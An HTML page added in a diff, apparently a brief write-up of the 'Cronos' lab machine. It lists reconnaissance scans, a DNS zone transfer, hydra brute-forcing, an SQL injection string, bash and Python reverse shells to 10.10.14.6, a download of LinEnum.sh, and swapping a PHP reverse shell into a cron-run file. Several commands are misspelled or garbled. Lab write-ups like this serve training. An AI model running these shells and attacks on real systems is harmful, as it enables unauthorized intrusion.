@@ -1,0 +1,30 @@
+<html>
+    <head></head>
+    <div>
+        <h1>Cronos WriteUP</h1>
+        <p>Steps are Reconnaissance, Enumeration, Privilege Escalation</p>
+        <br>
+        <ol><li>Reconnaissance: nmap -sC -sV -O -oA initial 10.10.10.13,<br>
+                 nampa -sC -sV –o -p- -oA full 10.10.10.13, nmap -sU -O -p- -oA udp 10.10.10.13</li>
+            <li>Enumeration: nmap –script vuln 10.10.10.13, gobuster dir -w /usr/share/wordlists/dirbuster/dicrectory-list-2.3-medium.txt -u 10.10.10.13,<br>
+                  nslookup, 10.10.10.13 cronos.htb, host -l cronos.htb 10.10.10.13, 10.10.10.13 cronos.htb www.cronos.htb admin cronos.htb, </li>
+            <li>Gaining an Initial Foothold: locate password | grep john, wc -l /usr/share/john/password.lst,<br>
+                hydra -l ‘admin’ -P /usr/share/john/password.lst admin.cronos.htb<br>
+                http-post-form “/:username=^USER^&password=^PASS^&Login=:your Login Name or Password is invalid”,<br>
+                sqlmap -v 4 -r login.txt, admin’ ORDER BY 1—CKDl, /bin/bash -i >& /dev/tcp/10.10.14.6/4444 0>&1, <br>
+                nc -nlvp 4444, which bash, python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>
+                s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);<br>
+                p=subprocess.call(["/bin/sh","-i"]);',</li>
+            <li>Python -c ‘import pty; pty.spawn(“/bin/bash”)’</li>
+            <li>Sty raw -echo</li>
+            <li>Privilege Escalation: python -m SimpleHTTPServer 5555</li>
+            <li>Cd /tmp</li>
+            <li>Wget http://10.10.10.14.6:5555/LinEnum.sh</li>
+            <li>Chmod +x LinEnum.sh<li>
+            <li>./LinEnum.sh</li>
+            <li>cp php-reverse-shell.php artisan</li>
+            <li>nc -nlvp 1234</li>
+        </ol> 
+
+    </div>
+</html>
